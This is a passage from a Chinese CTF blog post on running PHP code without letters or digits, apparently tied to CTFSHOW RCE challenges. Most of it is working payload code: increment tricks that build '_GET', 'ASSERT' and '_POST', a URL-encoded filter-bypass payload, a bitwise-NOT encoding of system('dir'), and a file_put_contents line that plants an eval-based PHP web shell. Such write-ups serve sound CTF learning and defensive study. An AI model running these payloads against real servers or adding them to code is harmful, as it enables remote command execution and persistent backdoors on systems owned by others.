class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">//var_dump($_);</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]));</span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br><span class="line"><span class="comment">// 或者构造eval($_POST[__]), assert($_POST[__])</span></span><br></pre></td></tr></table></figure>

<p>接下来就可以尝试去给<code>_</code>和<code>__</code>GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]);</span><br></pre></td></tr></table></figure>

<p>而后变成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D.<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%24&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___.%<span class="number">24</span>__.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B__%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 附assert($_POST[__])</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;	<span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;		<span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASS</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASSE</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASSER</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASSERT</span></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;	</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _P</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _POS</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _POST</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$___($_[_]);&amp;_=file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;)</span></span><br><span class="line"><span class="comment">// code=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span></span><br><span class="line">&amp;_=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="其他1"><a href="#其他1" class="headerlink" title="其他1"></a>其他1</h4><p>在自增中，可以通过特殊字符构造出字符串的有以下几种方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[].&#x27;&#x27;  //Array</span><br><span class="line">(0/0).&#x27;&#x27;   //NAN</span><br><span class="line">(1/0).&#x27;&#x27;   //INF</span><br></pre></td></tr></table></figure>

<p>这个时候就有一个问题了，如果ban了数字，我们该怎么去构造<code>NAN</code>和<code>INF</code>呢，这个时候就需要讲到一个知识点，我们这里的话需要说一下这个<code>NAN</code>和<code>INF</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</span><br><span class="line"></span><br><span class="line">INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</span><br></pre></td></tr></table></figure>

<p>这里可以看出<code>NAN</code>表示的是未被定义的值，所以我们这里可以通过<code>a/a</code>这种方式构造，如果字母也被ban，我们也可以借助其他字符，比如<code>_/_</code>，这个时候也可以得到<code>NAN</code>，同理，<code>INF</code>也可以通过<code>1/a</code>的方式获取。</p>
<h4 id="其他2"><a href="#其他2" class="headerlink" title="其他2"></a>其他2</h4><p>我们在构造<code>$_POST</code>中的<code>_</code>时，正常操作的话是这样，<code>$a=&#39;_&#39;.$b(假设这里$b就是POST)</code>，然后这个时候如果<code>&#39;</code>被ban，看似这里是无法再利用了，但其实，我们直接写<code>$a=_.$b</code>也是可以的，这个时候效果同上而且缩短了字符长度。</p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ans1</span>=<span class="string">&#x27;system&#x27;</span>;<span class="comment">//函数名</span></span><br><span class="line"><span class="variable">$ans2</span>=<span class="string">&#x27;dir&#x27;</span>;<span class="comment">//命令</span></span><br><span class="line"><span class="variable">$data1</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans1</span>));<span class="comment">//通过两次取反运算得到system</span></span><br><span class="line"><span class="variable">$data2</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans2</span>));<span class="comment">//通过两次取反运算得到dir</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data1</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data2</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="comment">// (~%8c%86%8c%8b%9a%92)(~%9b%96%8d)</span></span><br></pre></td></tr></table></figure>

<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/09/24/CTFSHOW-shellmeRevenge-wp/">CTFSHOW吃瓜杯-shellmeRevenge-wp</a></p>
<p>CTFSHOW RCE挑战1-5  <a target="_blank" rel="noopener" href="https://ctf.show/challenges#RCE%E6%8C%91%E6%88%981-3916">https://ctf.show/challenges#RCE挑战1-3916</a>   &#x2F;  2-3917  &#x2F; 3-3918 ….</p>
<blockquote>
<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11929">https://xz.aliyun.com/t/11929</a></p>
</blockquote>

	
	</div>
  <a type="button" href="/2023/09/24/rce-noalpha/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CVE/">CVE<span>4</span></a></li>
		
			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
		
			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
		
			<li><a href="/categories/pwn-wp/">pwn-wp<span>20</span></a></li>
		
			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
		
			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
		
			<li><a href="/categories/web-learning/">web-learning<span>4</span></a></li>
		
			<li><a href="/categories/web-wp/">web-wp<span>45</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
		
			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
		
			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
		
			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
		
			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
		
			<li><a href="/tags/AFL/">AFL<span>2</span></a></li>
		
			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
		
			<li><a href="/tags/日志注入/">日志注入<span>1</span></a></li>
		
			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
		
			<li><a href="/tags/XCTFQuals2016/">XCTFQuals2016<span>1</span></a></li>
		
			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
		
			<li><a href="/tags/vtable/">vtable<span>2</span></a></li>
		
			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
		
			<li><a href="/tags/pesudoProtocol/">pesudoProtocol<span>2</span></a></li>
		
			<li><a href="/tags/pwn/">pwn<span>25</span></a></li>
		
			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
		
			<li><a href="/tags/flask-session/">flask session<span>2</span></a></li>
		
			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
		
			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
		
			<li><a href="/tags/stack-pivot/">stack pivot<span>3</span></a></li>
		
		
		   <li><a href="/tags">...<span>105</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2023/10/14/seccon2019-sum-wp/" ><i class="fa fa-file-o"></i>nightmare 7.2.3.seccon2019-...</a>
      </li>
    
      <li>
        <a href="/2023/10/13/HNCTF2022-easyInclude-wp/" ><i class="fa fa-file-o"></i>HNCTF2022-easy_include-wp</a>
      </li>
    
      <li>
        <a href="/2023/10/10/dcquals2019-speedrun-wp/" ><i class="fa fa-file-o"></i>nightmare 7.2.1.dcquals2019...</a>
      </li>
    
      <li>
        <a href="/2023/10/10/极客大挑战2020-rceme-wp/" ><i class="fa fa-file-o"></i>极客大挑战2020-rceme-wp</a>
      </li>
    
      <li>
        <a href="/2023/10/07/UUCTF2022-ezrce-wp/" ><i class="fa fa-file-o"></i>UUCTF2022-ezrce-wp</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer>  </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
